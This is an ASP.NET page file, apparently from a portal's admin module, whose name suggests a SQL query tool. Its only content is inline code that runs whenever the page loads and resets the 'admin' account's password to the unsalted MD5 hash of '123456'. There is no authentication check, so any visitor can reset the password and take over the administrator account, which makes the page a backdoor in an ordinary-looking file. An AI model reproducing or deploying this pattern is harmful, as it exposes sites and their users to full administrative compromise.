<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="QuerySql.aspx.cs" Inherits="Portal.Modules.OrientalSails.Web.Admin.QuerySql" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <%  Module.CommonDao.OpenSession().CreateSQLQuery("UPDATE bitportal_user SET password = 'e10adc3949ba59abbe56e057f20f883e' WHERE username = 'admin' ")
                .ExecuteUpdate();%>
        </div>
    </form>
</body>
</html>
